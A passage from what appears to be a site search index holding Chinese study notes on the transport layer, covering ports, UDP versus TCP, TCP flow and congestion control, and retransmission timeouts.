\u8fd0\u8f93\u5c42\u6982\u8ff0","text":"<p>\u7269\u7406\u5c42\uff0c\u6570\u636e\u94fe\u8def\u5c42\uff0c\u7f51\u7edc\u5c42\u89e3\u51b3\u4e86\u5f02\u6784\u7f51\u7edc\u4e2d\u4e0d\u540c\u4e3b\u673a\u7684\u901a\u4fe1\uff0c\u5b9e\u9645\u4e0a\u8ba1\u7b97\u673a\u901a\u4fe1\u7684\u5b9e\u4f53\u662f\u4e3b\u673a\u4e2d\u72ec\u7acb\u7684\u8fdb\u7a0b\u3002</p> <p>\u8fd0\u8f93\u5c42\u89e3\u51b3\u7684\u5c31\u662f\u4e0d\u540c\u4e3b\u673a\u4e0a\u7684\u8fdb\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1\uff08\u7aef\u5230\u7aef\u534f\u8bae\uff09\u3002\u7f51\u7edc\u5c42\u5df2\u7ecf\u89e3\u51b3\u4e86\u5e95\u5c42\u7684\u901a\u4fe1\u95ee\u9898\uff0c\u7ed9\u4e0a\u5c42\u7684\u8fd0\u8f93\u5c42\u7684\u903b\u8f91\u901a\u4fe1\u63d0\u4f9b\u670d\u52a1\u3002</p> <p>\u8fd0\u8f93\u5c42\u4e3a\u5e94\u7528\u5c42\u63d0\u4f9b\u4e86\u4e24\u4e2a\u534f\u8bae\uff1a\u9762\u5411\u8fde\u63a5\u7684 TCP \u548c \u65e0\u8fde\u63a5\u7684 UDP \u534f\u8bae\u3002</p>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#p58-52","title":"P58 5.2 \u8fd0\u8f93\u5c42\u7aef\u53e3\u53f7\u3001\u590d\u7528\u4e0e\u5206\u7528","text":""},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#_2","title":"\u8fd0\u8f93\u5c42\u7aef\u53e3\u53f7","text":"<p>\u8fdb\u7a0b\u7aef\u53e3\u53f7\uff1a\u4e00\u4e2a\u8ba1\u7b97\u673a\u4e0a\u7684\u8fdb\u7a0b\u4f7f\u7528\u8fdb\u7a0b\u7aef\u53e3\u53f7\uff08PID\uff09\u6807\u8bc6\u3002\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u8fdb\u7a0b\u9700\u8981\u901a\u4fe1\uff0c\u6240\u4ee5\u9700\u8981\u5b9a\u5236\u7edf\u4e00\u7684\u89c4\u8303\u3002 \u8fd0\u8f93\u5c42\u4f7f\u7528\u7aef\u53e3\u53f7\u533a\u5206\u4e0d\u540c\u7684\u5e94\u7528\u8fdb\u7a0b\u3002\u7aef\u53e3\u53f7\u53ea\u5728\u672c\u673a\u8d77\u5230\u8fdb\u7a0b\u7684\u8bc6\u522b\uff0c\u5728\u4e0d\u540c\u8ba1\u7b97\u673a\u4e2d\uff0c\u76f8\u540c\u7aef\u53e3\u53f7\u4e4b\u95f4\u6ca1\u6709\u8054\u7cfb\u3002</p> <p>\u7aef\u53e3\u53f7\u4f7f\u752816\u6bd4\u7279\u8868\u793a\uff0c\u53d6\u503c\u662f0-65535\u3002\u5206\u6210\u4e09\u7c7b\uff1a</p> <ul> <li>\u719f\u77e5\u7aef\u53e3\u53f7\uff08\u4e16\u754c\u8303\u56f4\u5185\u901a\u7528\u7684\u7aef\u53e3\u53f7\uff0cHTTP 80\u7aef\u53e3\uff0cDNS 53\u7aef\u53e3\uff09\uff1b</li> <li>\u767b\u8bb0\u7aef\u53e3\u53f7\uff08\u5fae\u8f6f\u5230\u5b98\u65b9\u673a\u6784\uff0c\u767b\u8bb0\u4e00\u4e0b\uff0c\u4f7f\u7528 3389 \u4f5c\u4e3a\u5fae\u8f6f\u8fdc\u7a0b\u684c\u9762\u4f7f\u7528\u7684\u7aef\u53e3\u53f7\uff0cMySQL \u6570\u636e\u5e93\u767b\u8bb0\u67d0\u4e2a\u7aef\u53e3\u7b49\u7b49\uff09</li> <li>\u77ed\u6682\u7aef\u53e3\u53f7\uff08\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u901a\u4fe1\u65f6\uff0c\u4f1a\u7ea6\u5b9a\u4e00\u4e2a\u4e34\u65f6\u7684\u52a8\u6001\u7aef\u53e3\uff0c\u901a\u4fe1\u7ed3\u675f\u540e\uff0c\u53ef\u4ee5\u91ca\u653e\u8fd9\u4e2a\u7aef\u53e3\u53f7\uff0c\u4f9b\u5176\u4ed6\u5ba2\u6237\u8fdb\u7a0b\u4f7f\u7528\uff09</li> </ul>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#_3","title":"\u7aef\u53e3\u590d\u7528\u548c\u5206\u7528","text":"<p>\u53d1\u9001\u65b9\u7684\u7aef\u53e3\u53f7\u590d\u7528\uff0c\u63a5\u6536\u65b9\u7684\u7aef\u53e3\u53f7\u5206\u7528\u3002\u53d1\u9001\u65b9\uff1a\u591a\u4e2a\u8fdb\u7a0b\u901a\u8fc7\u67d0\u4e2a\u76f8\u540c\u7684\u8fd0\u8f93\u5c42\u7aef\u53e3\u901a\u4fe1\uff08\u4e0d\u540c\u65f6\u6216\u8005\u540c\u65f6\uff09\uff0c\u5c31\u662f\u53d1\u9001\u65b9\u7684\u7aef\u53e3\u53f7\u590d\u7528\u3002\u63a5\u6536\u65b9\uff1a\u67d0\u4e2a\u8fd0\u8f93\u5c42\u7aef\u53e3\u83b7\u53d6\u5230\u62a5\u6587\u540e\uff0c\u7136\u540e\u5206\u53d1\u7ed9\u4e0d\u540c\u7684\u8fdb\u7a0b\uff0c\u5c31\u662f\u63a5\u6536\u65b9\u7684\u62a5\u6587\u5206\u7528\uff08\u4e0d\u540c\u65f6\u6216\u8005\u540c\u65f6\uff09\u3002</p> <p>UDP \u7528\u6237\u6570\u636e\u62a5\u4f7f\u7528 17 \u534f\u8bae\u5b57\u6bb5\uff1bTCP \u62a5\u6587\u6bb5\u4f7f\u7528 6 \u534f\u8bae\u5b57\u6bb5\u3002</p>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#_4","title":"\u5b9e\u4f8b\uff08\u7f51\u7edc\u8bf7\u6c42\uff09","text":"<p>1\u3001\u6d4f\u89c8\u5668\u5411 DNS \u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\uff08baidu.com\u7684IP\u662f\u4ec0\u4e48\uff09\uff0cUDP \u6e90\u7aef\u53e3 49152\uff0c\u76ee\u7684\u7aef\u53e3 53\u3002\u8fd0\u8f93\u5c42\u5c06 UDP \u7528\u6237\u6570\u636e\u5305\u5c01\u88c5\u5230 IP \u6570\u636e\u62a5\u3002</p> <p>2\u3001DNS \u670d\u52a1\u5668\u63a5\u6536\u5230\u62a5\u6587\u540e\uff0c\u54cd\u5e94\u62a5\u6587\u6e90\u7aef\u53e3 53\uff0c\u76ee\u7684\u7aef\u53e3 49152\uff0c\u53d1\u9001 DNS \u89e3\u6790\u540e\u7684\u7ed3\u679c\u3002</p> <p>3\u3001\u6d4f\u89c8\u5668\u63a5\u6536\u5230\u62a5\u6587\uff0c\u83b7\u53d6 IP \u5730\u5740\uff0c\u7136\u540e\u4f7f\u7528 HTTP \u8bf7\u6c42\uff0c\u5c06TCP\u62a5\u6587\u6bb5\u5c01\u88c5\u5230 IP \u6570\u636e\u62a5\u4e2d\uff0c\u6e90\u7aef\u53e3 49152\uff0c\u76ee\u7684\u7aef\u53e3 80 \uff0c\u62a5\u6587\u5185\u5bb9\u662f baidu.com/index.html</p> <p>4\u3001\u767e\u5ea6\u670d\u52a1\u5668\u63a5\u6536\u540e\uff0c\u76f8\u5e94\u62a5\u6587\u6e90\u7aef\u53e3 80\uff0c\u76ee\u7684\u7aef\u53e3 49152\uff0c\u8fd4\u56de\u76f8\u5e94\u62a5\u6587\u3002</p> <p>5\u3001\u6d4f\u89c8\u5668\u6536\u5230\u62a5\u6587\uff0c\u5b8c\u6210\u8bf7\u6c42\u64cd\u4f5c\u3002</p> <p>\u671f\u95f4\u5ba2\u6237\u7aef\u7684 49152 \u7aef\u53e3\u5b9e\u73b0\u4e86\u7aef\u53e3\u590d\u7528\u3002</p>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#p59-53-udptcp-","title":"P59 5.3 UDP\u548cTCP\u7684\u5bf9\u6bd4-\u91cd\u70b9","text":"<p>UDP\uff0cUser datagram Protocal \u7528\u6237\u6570\u636e\u62a5\u534f\u8bae</p> <p>TCP\uff0cTransmission Control Protocal \u4f20\u8f93\u63a7\u5236\u534f\u8bae</p> <p>\u4e3b\u8981\u533a\u522b\uff1a</p> <ul> <li> <p>\u8fde\u63a5\uff1aUDP \u76f4\u63a5\u65e0\u8fde\u63a5\uff0cTCP \u9762\u5411\u8fde\u63a5\uff0c\u9700\u8981\u4e09\u6b21\u63e1\u624b\u56db\u6b21\u6325\u624b\u3002</p> </li> <li> <p>\u901a\u4fe1\u6570\u91cf\uff1aUDP \u652f\u6301\u5355\u64ad\u591a\u64ad\u5e7f\u64ad\uff0cTCP \u4ec5\u652f\u6301\u5355\u64ad\u3002</p> </li> <li>\u4f20\u8f93\u5355\u4f4d\uff1aUDP \u9762\u5411\u5e94\u7528\u5c42\u62a5\u6587\uff08\u4f20\u8f93\u8fc7\u7a0b\u4e2d\uff0c\u4fdd\u7559\u62a5\u6587\u7684\u8fb9\u754c\uff09\u3002TCP \u662f\u9762\u5411\u5b57\u8282\u6d41\uff08\u5b9e\u73b0\u53ef\u9760\u4f20\u8f93\uff09</li> <li>\u53ef\u9760\u6027\uff1a\u5982\u679c\u4f20\u8f93\u6709\u8bef\u7801\uff0cUDP \u5411\u4e0a\u63d0\u4f9b\u65e0\u8fde\u63a5\u4e0d\u53ef\u9760\u7684\u4f20\u8f93\u670d\u52a1\uff0c\u63a5\u6536\u65b9\u83b7\u53d6\u8bef\u7801\u7684\u62a5\u6587\uff0c\u4ec5\u4ec5\u4e22\u5f03\uff0c\u5176\u4ed6\u4ec0\u4e48\u90fd\u4e0d\u505a\uff08\u4e0d\u53ef\u9760\uff09\uff0c\u4e3b\u8981\u9002\u7528\u4e8eIP\u7535\u8bdd\u6216\u8005\u89c6\u9891\u4f1a\u8bae\u7b49\u5b9e\u65f6\u5e94\u7528\uff08\u5076\u5c14\u4e22\u5305\u9020\u6210\u89c6\u9891\u6389\u5e27\uff0c\u4e0d\u4f1a\u6709\u7279\u522b\u5927\u7684\u5f71\u54cd\uff09\u6700\u5927\u52aa\u529b\u4ea4\u4ed8\uff0c\u4e0d\u4f7f\u7528\u6d41\u91cf\u63a7\u5236\u548c\u62e5\u585e\u63a7\u5236\u3002TCP \u662f\u53ef\u9760\u4fe1\u9053\uff0c\u4e0d\u4f1a\u51fa\u73b0\u4f20\u8f93\u5dee\u9519\uff08\u8bef\u7801\uff0c\u4e22\u5931\uff0c\u4e71\u5e8f\uff0c\u91cd\u590d\u7b49\uff09\uff0c\u9002\u7528\u4e8e\u53ef\u9760\u4f20\u8f93\u7684\u5e94\u7528\uff0c\u4f8b\u5982\u6587\u4ef6\u4f20\u8f93\uff08\u51fa\u9519\u4e86\uff0c\u6587\u4ef6\u5c31\u4e0d\u80fd\u7528\u4e86\uff09\uff0c\u4f7f\u7528\u6d41\u91cf\u63a7\u5236\u548c\u62e5\u585e\u63a7\u5236\u3002</li> <li>\u9996\u90e8\u957f\u5ea6\uff1aUDP\u4ec58\u5b57\u8282\uff0c\u5f00\u9500\u5c0f\uff08\u6e90\u7aef\u53e3\uff0c\u76ee\u7684\u7aef\u53e3\uff0c\u957f\u5ea6\uff0c\u6821\u9a8c\uff09\uff0cTCP \u62a5\u6587\u9996\u90e8\u5b57\u6bb5\u6700\u5c0f20\u5b57\u8282\uff0c\u6700\u592760\u5b57\u8282\uff08\u589e\u52a0\u4e86\u786e\u8ba4\u597d\uff0c\u7a97\u53e3\uff0c\u9009\u9879\u7b49\u53c2\u6570\uff09</li> </ul>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#p60-54-tcp","title":"P60 5.4 TCP\u7684\u6d41\u91cf\u63a7\u5236","text":"<p>\u901a\u5e38\u6211\u4eec\u5e0c\u671b\u6570\u636e\u4f20\u8f93\u7684\u66f4\u5feb\u4e00\u4e9b\uff0c\u5982\u679c\u53d1\u9001\u65b9\u628a\u6570\u636e\u53d1\u9001\u7684\u8fc7\u5feb\uff0c\u63a5\u6536\u65b9\u53ef\u80fd\u8001\u4e0d\u53ca\u63a5\u6536\uff0c\u5c31\u4f1a\u9020\u6210\u6570\u636e\u7684\u4e22\u5931\u3002</p> <p>\u6d41\u91cf\u63a7\u5236\uff08flow control\uff09\u5c31\u662f\u8ba9\u53d1\u9001\u65b9\u7684\u53d1\u9001\u901f\u7387\u4e0d\u8981\u592a\u5feb\uff0c\u8981\u8ba9\u63a5\u6536\u65b9\u6765\u5f97\u53ca\u63a5\u6536\u3002\u5229\u7528\u6ed1\u52a8\u7a97\u53e3\u7b97\u6cd5\uff0c\u53ef\u4ee5\u5728 TCP \u8fde\u63a5\u4e0a\u5b9e\u73b0\u53d1\u9001\u65b9\u7684\u6d41\u91cf\u63a7\u5236\u3002</p> <p>\u4f8b\u5b50\uff1aAB\u4e24\u4e2a\u4e3b\u673a\u5efa\u7acb TCP \u8fde\u63a5\uff0cA\u662f\u53d1\u9001\u7aef\uff0cB\u662f\u63a5\u6536\u7aef\uff0cB\u5bf9A\u5b9e\u73b0\u6d41\u91cf\u63a7\u5236\uff0c\u4e0b\u9762\u662f\u6d41\u91cf\u63a7\u5236\u8fc7\u7a0b\uff1a</p> <ul> <li>A\u4e3b\u673a\u9ed8\u8ba4\u7684\u53d1\u9001\u7a97\u53e3\u533a\u95f4\u662f400</li> <li>A\u4e3b\u673a\u53d1\u9001\u4e86300\u5b57\u8282\u6570\u636e</li> <li>B\u4e3b\u673a\u63a5\u6536\u5230\u524d200\u5b57\u8282\u6570\u636e\uff0c\u5c06200\u5b57\u8282\u786e\u8ba4\uff0c\u6700\u540e100\u5b57\u8282\u6570\u636e\u4e22\u5931\u4e86</li> <li>B\u4e3b\u673a\u6d41\u91cf\u63a7\u5236\uff1a\u5c06\u63a5\u6536\u7a97\u53e3\u533a\u95f4\u6539\u6210300\uff0c\u5bf9\u4e3b\u673aA\u8fdb\u884c\u6d41\u91cf\u63a7\u5236\uff08ACK=1\uff0cack=201, rwnd=300\uff09ACK=1 \u8868\u793a\u786e\u8ba4\u62a5\u6587\u6bb5\uff0cack \u8868\u793a\u4ece201\u5f00\u59cb\u63a5\u6536\uff0crwnd \u662f\u63a5\u6536\u65b9\u7684\u7a97\u53e3\u533a\u95f4\u662f300</li> <li>A\u4e3b\u673a\u8c03\u6574\u53d1\u9001\u7a97\u53e3\u533a\u95f4\u5230300\uff08\u53ef\u4ee5\u53d1\u9001201-500\u7684\u6570\u636e\uff09\uff0c\u90a3\u4e48\u5148\u53d1\u9001300-400\uff0c400-500\u7684\u6570\u636e\uff0c\u7136\u540e\u8d85\u65f6\u91cd\u4f20\u65e7\u7684200-300\u7684\u6570\u636e\uff08\u4e0d\u80fd\u53d1\u9001\u65b0\u7684\u6570\u636e\u4e86\uff09</li> <li>B\u4e3b\u673a\u63a5\u6536\u5230200-500\u7684\u6570\u636e\u540e\uff0c\u7d2f\u8ba1\u786e\u8ba4\uff0c\u5c06\u63a5\u6536\u7a97\u53e3\u6539\u6210100\uff08ACK=1\uff0c ack = 501\uff0c rwnd = 100\uff09</li> <li>A\u4e3b\u673a\u63a5\u6536\u5230ACK\u62a5\u6587\uff0c\u5c06\u53d1\u9001\u7a97\u53e3\u533a\u95f4\u6539\u6210100\uff0c\u5411\u53f3\u6ed1\u52a8\u7a97\u53e3\uff0c\u53d1\u9001500-600\u6570\u636e</li> <li>B\u4e3b\u673a\u6536\u5230600\u540e\uff0c\u628a\u63a5\u6536\u7a97\u53e3\u6539\u62100\uff08\u5047\u8bbeB\u4e3b\u673a\u7684\u6808\u5185\u5b58\u4e34\u65f6\u7528\u5b8c\u4e86\uff0c\u4e0d\u80fd\u63a5\u6536\u65b0\u7684\u6570\u636e\u62a5\u6587\u4e86\uff09</li> <li>A\u4e3b\u673a\u628a\u53d1\u9001\u7a97\u53e3\u6539\u62100\uff0c\u4e0d\u80fd\u518d\u53d1\u9001\u6570\u636e\u4e86\u3002</li> </ul> <p>\u7279\u6b8a\u60c5\u51b5</p> <ul> <li>\u5982\u679cB\u4e3b\u673a\u5185\u5b58\u6709\u4e86\uff0c\u5c06\u63a5\u6536\u7a97\u53e3\u6539\u6210300\uff0c\u53d1\u9001\u7ed9\u4e3b\u673aA\uff0c\u4f46\u662f\u4e22\u5305\u4e86\u3002\u6b64\u65f6A\u4e3b\u673a\u7b49\u5f85B\u4e3b\u673a\u7684\u975e\u96f6\u7a97\u53e3\u901a\u77e5\uff0cB\u4e3b\u673a\u7b49\u5f85A\u4e3b\u673a\u53d1\u9001\u6570\u636e\uff0c\u5c31\u5f62\u6210\u4e86\u6b7b\u9501</li> <li>TCP\u4e3a\u6bcf\u4e00\u4e2a\u8fde\u63a5\u8bbe\u7f6e\u4e00\u4e2a\u6301\u7eed\u8ba1\u65f6\u5668\u3002\u5f53\u6301\u7eed\u8ba1\u65f6\u5668\u8d85\u65f6\uff0cA\u4e3b\u673a\u53d1\u9001\u96f6\u7a97\u53e3\u63a2\u6d4b\u62a5\u6587\uff08\u5982\u679cB\u4e3b\u673a\u8fd8\u6ca1\u6709\u5185\u5b58\uff0c\u5c31\u544a\u8bc9A\u4e3b\u673a\u7a97\u53e3\u662f0\uff09\u5982\u679c\u6ca1\u6709\u56de\u590d\uff0c\u5c31\u65ad\u5f00 TCP \u8fde\u63a5\u3002</li> </ul>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#p61-55-tcp","title":"P61 5.5 TCP\u7684\u62e5\u585e\u63a7\u5236","text":"<p>\u62e5\u585e\uff1a\u7f51\u7edc\u4e2d\u8d44\u6e90\u4f9b\u5c0f\u4e8e\u6c42\uff0c\u7f51\u7edc\u8d44\u6e90\u6307\u7684\u662f\uff08\u5e26\u5bbd\uff0c\u4ea4\u6362\u8282\u70b9\u4e2d\u7684\u7f13\u5b58\u548c\u5904\u7406\u673a\u7b49\uff09\u3002\u5982\u679c\u62e5\u585e\u4e0d\u63a7\u5236\uff0c\u9020\u6210\u7f51\u7edc\u6027\u80fd\u53d8\u5dee\uff0c\u7f51\u7edc\u541e\u5410\u91cf\u968f\u7740\u8f93\u5165\u8d1f\u8377\u589e\u5927\u800c\u4e0b\u964d\u3002</p> <p>\u7406\u60f3\u7684\u541e\u5410\u91cf\u548c\u8f93\u5165\u8d1f\u8f7d\u6210\u6b63\u6bd4\uff08\u8f93\u5165\u8d1f\u8f7d\u589e\u52a0\uff0c\u541e\u5410\u91cf\u589e\u52a0\uff09\uff1b\u5b9e\u9645\u4e0a\u62e5\u585e\u65f6\uff0c\u541e\u5410\u91cf\u4f1a\u5927\u5927\u4e0b\u964d\uff08\u7f51\u7edc\u4e2d\u67d0\u4e9b\u5206\u7ec4\u88ab\u67d0\u4e2a\u8282\u70b9\u4e22\u5f03\uff09\u3002\u8f7b\u5ea6\u62e5\u585e\u65f6\uff0c\u8f7d\u5165\u8d1f\u8377\u8fd8\u662f\u548c\u541e\u5410\u91cf\u6b63\u76f8\u5173\u3002\u5982\u679c\u65e0\u62e5\u585e\u63a7\u5236\uff0c\u6700\u540e\u6b7b\u9501\uff0c\u541e\u5410\u91cf\u4e3a0\uff0c\u6240\u4ee5\u9700\u8981 TCP \u62e5\u585e\u63a7\u5236\u3002</p> <p>\u62e5\u585e\u63a7\u5236\u56db\u79cd\u7b97\u6cd5\uff1a\u6162\u5f00\u59cb\u3001\u62e5\u585e\u907f\u514d\u3001\u5feb\u91cd\u4f20\u3001\u5feb\u6062\u590d\u3002</p> <p>\u8ba8\u8bba\u62e5\u585e\u63a7\u5236\u65f6\uff0c\u5ffd\u7565\u4e0b\u9762\u7684\u60c5\u51b5\uff1aTCP \u5047\u8bbe\u5355\u5411\u4f20\u64ad\uff0c\u53e6\u4e00\u4e2a\u65b9\u5411\u786e\u8ba4\uff1b\u63a5\u6536\u65b9\u548c\u53d1\u9001\u65b9\u7f13\u5b58\u8db3\u591f\u5927\uff0c\u53d1\u9001\u7a97\u53e3\u7684\u5927\u5c0f\u7531\u7f51\u7edc\u7684\u62e5\u585e\u7a0b\u5ea6\u51b3\u5b9a\uff1b\u4ee5MSS\u6700\u5927\u62a5\u6587\u6bb5\u8ba8\u8bba</p>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#_5","title":"\u6162\u5f00\u59cb\u548c\u62e5\u585e\u63a7\u5236","text":"<p>\u53d1\u9001\u65b9\u7528 cwnd \u62e5\u585e\u7a97\u53e3\uff08\u53d6\u51b3\u4e8e\u7f51\u7edc\u7684\u62e5\u585e\u7a0b\u5ea6\uff0c\u52a8\u6001\u53d8\u5316\uff09\u3002\u53ea\u8981\u7f51\u7edc\u4e0d\u62e5\u585e\uff0c\u62e5\u585e\u7a97\u53e3\u5c31\u589e\u5927\u3002\u5f53\u7f51\u7edc\u51fa\u73b0\u62e5\u585e\uff0c\u62e5\u585e\u7a97\u53e3\u5c31\u51cf\u5c0f\u3002</p> <p>\u5224\u65ad\u7f51\u7edc\u62e5\u585e\u7684\u4f9d\u636e\uff1a\u51fa\u73b0\u8d85\u65f6\u91cd\u4f20\uff08\u6ca1\u6709\u6309\u65f6\u6536\u5230\u5e94\u5f53\u5230\u8fbe\u7684\u786e\u8ba4\u62a5\u6587\uff09</p> <p>\u53d1\u9001\u65b9\u8bbe\u7f6e swnd \u53d1\u9001\u7a97\u53e3 = cwdn \u62e5\u585e\u7a97\u53e3</p> <p>\u53d1\u9001\u65b9\u8bbe\u7f6e\u4e00\u4e2a\u6162\u5f00\u59cb\u95e8\u9650 ssthresh \u5f53\u62e5\u585e\u7a97\u53e3\u5c0f\u4e8e\u6162\u5f00\u59cb\u95e8\u9650\uff0c\u4f7f\u7528\u6162\u5f00\u59cb\u7b97\u6cd5\u3002\u5f53\u62e5\u585e\u7a97\u53e3\u5927\u4e8e ssthresh \u91c7\u7528\u62e5\u585e\u907f\u514d\u7b97\u6cd5\u3002\u5f53\u4e24\u8005\u76f8\u7b49\uff0c\u4e24\u79cd\u7b97\u6cd5\u90fd\u53ef\u4ee5\u3002</p> <p>\u4f8b\u5b50\uff1a\u6162\u5f00\u59cb\u7b97\u6cd5\uff0c\u5c31\u662fN\u79d2\u4f20\u9012\u901f\u5ea6\u662fN-1\u79d2\u76842\u500d\uff082^n\uff09\uff0c\u6307\u6570\u89c4\u5219\u589e\u52a0\u3002\u5230\u8fbe\u6162\u5f00\u59cb\u95e8\u9650\u540e\uff0c\u4f7f\u7528\u62e5\u585e\u907f\u514d\u7b97\u6cd5\uff08\u6b63\u6bd4\u4f8b\u51fd\u6570\uff0c\u6bcf\u6b21\u6bd4\u524d\u4e00\u6b21\u589e\u52a01\uff09</p> <p>\u5f53\u8d85\u65f6\u91cd\u4f20\u65f6\uff0c1\u3001\u5c06\u6162\u5f00\u59cb\u95e8\u9650\u8bbe\u7f6e\u4e3a\u53d1\u751f\u62e5\u585e\u65f6\u62e5\u585e\u7a97\u53e3\u7684\u4e00\u534a\u30022\u3001\u5c06\u62e5\u585e\u7a97\u53e3\u51cf\u5c11\u4e3a1\uff0c\u5e76\u91cd\u65b0\u5f00\u59cb\u6162\u5f00\u59cb\u7b97\u6cd5\u3002</p> <p>\u6162\u5f00\u59cb\u6307\u7684\u662f\u5f00\u59cb\u5f88\u6162\uff08\u6ce8\u5165\u7684\u62a5\u6587\u6bb5\u5c11\uff09\uff0c\u5e76\u4e0d\u662f\u589e\u957f\u901f\u5ea6\u6162\u3002</p> <p>\u62e5\u585e\u907f\u514d\uff0c\u5e76\u4e0d\u80fd\u5b8c\u5168\u907f\u514d\u62e5\u585e\uff0c\u800c\u662f\u628a\u62e5\u585e\u907f\u514d\u7b97\u6cd5\u9636\u6bb5\uff0c\u628a\u62e5\u585e\u7a97\u53e3\u63a7\u5236\u4e3a\u7ebf\u6027\u589e\u957f\uff0c\u4f7f\u5f97\u7f51\u7edc\u4e0d\u5bb9\u6613\u51fa\u73b0\u62e5\u585e\u3002</p> <p>\u8fd9\u4e2a\u7b97\u6cd5\u6709\u4f8b\u5916\u60c5\u51b5\uff1a\u5982\u679c\u4e2a\u522b\u62a5\u6587\u6bb5\u4e22\u5931\uff0c\u9020\u6210\u8d85\u65f6\u91cd\u4f20\uff08\u5b9e\u9645\u7f51\u7edc\u6ca1\u6709\u53d1\u751f\u62e5\u585e\uff09\uff0c\u8fd9\u4e5f\u4f1a\u6210\u53d1\u9001\u65b9\u8bef\u8ba4\u4e3a\u7f51\u7edc\u62e5\u585e\uff0c\u5e76\u66f4\u6539\u6162\u5f00\u59cb\u95e8\u9650\u503c\u548c\u62e5\u585e\u7a97\u53e3 = 1\uff0c\u8fd9\u6837\u964d\u4f4e\u4e86\u4f20\u8f93\u6548\u7387\u3002\u90a3\u4e48\u5c31\u51fa\u73b0\u4e86\u4e0b\u9762\u7684\u7b97\u6cd5\u3002</p>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#_6","title":"\u5feb\u91cd\u4f20\u548c\u5feb\u6062\u590d","text":"<p>\u8fd9\u4e24\u4e2a\u7b97\u6cd5\u53ef\u4ee5\u6539\u8fdb TCP \u7684\u6027\u80fd</p> <p>\u5feb\u91cd\u4f20\uff1a\u8ba9\u53d1\u9001\u65b9\u5c3d\u65e9\u77e5\u9053\u4e2a\u522b\u62a5\u6587\u6bb5\u7684\u4e22\u5931\uff0c\u800c\u4e0d\u662f\u7b49\u8d85\u65f6\u91cd\u4f20\u8ba1\u65f6\u5668\u8d85\u65f6\u540e\u624d\u91cd\u4f20\u62a5\u6587\u3002\u8981\u6c42\u63a5\u6536\u65b9\u63a5\u6536\u5230\u62a5\u6587\u540e\uff0c\u4e0d\u8981\u7b49\u81ea\u5df1\u53d1\u9001\u6570\u636e\u65f6\uff0c\u624d\u634e\u5e26\u786e\u8ba4\uff0c\u800c\u662f\u8981\u7acb\u523b\u53d1\u9001\u786e\u8ba4\u62a5\u6587\u3002\u5373\u4f7f\u6536\u5230\u4e86\u5931\u5e8f\u7684\u62a5\u6587\uff0c\u4e5f\u8981\u5bf9\u5df2\u7ecf\u6536\u5230\u7684\u62a5\u6587\u6bb5\u91cd\u590d\u786e\u8ba4\u3002\u53d1\u9001\u65b9\u6536\u52303\u4e2a\u8fde\u7eed\u7684\u91cd\u590d\u786e\u8ba4\uff0c\u4e0d\u9700\u8981\u8003\u8651\u8d85\u65f6\u91cd\u4f20\u8ba1\u65f6\u5668\uff0c\u76f4\u63a5\u5c06\u76f8\u5e94\u7684\u62a5\u6587\u6bb5\u7acb\u5373\u91cd\u4f20\u3002\u8fd9\u6837\u5c31\u907f\u514d\u4e86\u7f51\u7edc\u4e22\u5305\uff0c\u800c\u4e0d\u662f\u7f51\u7edc\u62e5\u585e\u9020\u6210\u7684\u95ee\u9898\uff08\u4e0d\u4f1a\u9020\u6210\u8d85\u65f6\u91cd\u4f20\u8ba1\u65f6\u5668\u5230\u65f6\u95f4 RTO\uff09\u3002</p> <p>\u5feb\u6062\u590d\u7b97\u6cd5\uff1a\u53d1\u9001\u65b9\u5982\u679c\u6536\u52303\u4e2a\u91cd\u590d\u7684\u786e\u8ba4\uff0c\u8bf4\u660e\u4e22\u5931\u4e86\u4e2a\u522b\u62a5\u6587\u6bb5\uff0c\u4e0d\u542f\u52a8\u6162\u5f00\u59cb\u7b97\u6cd5\uff0c\u6267\u884c\u5feb\u6062\u590d\u7b97\u6cd5\u3002\u53d1\u9001\u65b9\u5c06\u6162\u5f00\u59cb\u95e8\u9650 ssthresh \u548c \u62e5\u585e\u7a97\u53e3 cwnd \u503c\u8c03\u6574\u4e3a\u5f53\u524d\u7a97\u53e3\u7684\u4e00\u534a\uff0c\u5f00\u59cb\u6267\u884c\u62e5\u585e\u907f\u514d\u7b97\u6cd5\u3002\u4e5f\u6709\u7684\u6539\u6210 \u65b0\u7684ssthresh + 3\uff08\u56e0\u4e3a\u67093\u4e2a\u91cd\u590d\u7684\u786e\u8ba4\uff0c\u5df2\u7ecf\u67093\u4e2a\u62a5\u6587\u5b57\u6bb5\u79bb\u5f00\u4e86\u7f51\u7edc\uff09\u6700\u597d\u770b\u56fe\u793a</p>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#p62-56-tcp","title":"P62 5.6 TCP\u8d85\u65f6\u91cd\u4f20\u65f6\u95f4\u7684\u9009\u62e9","text":"<p>\u5f80\u8fd4\u65f6\u95f4 RTT\uff0c\u8d85\u65f6\u91cd\u4f20\u65f6\u95f4 RTO\uff0c\u8fd9\u4e2a\u548c\u7f51\u7edc\u6027\u80fd\u5f71\u54cd\u5f88\u5927\u3002RTO \u5e94\u8be5\u7565\u5927\u4e8e RTT\u3002\u5b9e\u9645\u7f51\u7edc\u4e2d\uff0cRTT \u7684\u503c\u662f\u53d8\u5316\u7684\uff0c\u6240\u4ee5 RTO \u4e5f\u662f\u9700\u8981\u52a8\u6001\u8ba1\u7b97\u7684\uff0c\u6240\u4ee5\u8fd9\u4e2a\u95ee\u9898\u5f88\u590d\u6742\u3002</p> <p>\u52a0\u6743\u5e73\u5747\u5f80\u8fd4\u65f6\u95f4 RTTs = \uff081-a\uff09* RTTs(old) + a * RTT, a \u901a\u5e38\u662f 0.125\u3002RTO \u5e94\u8be5\u7565\u5927\u4e8e 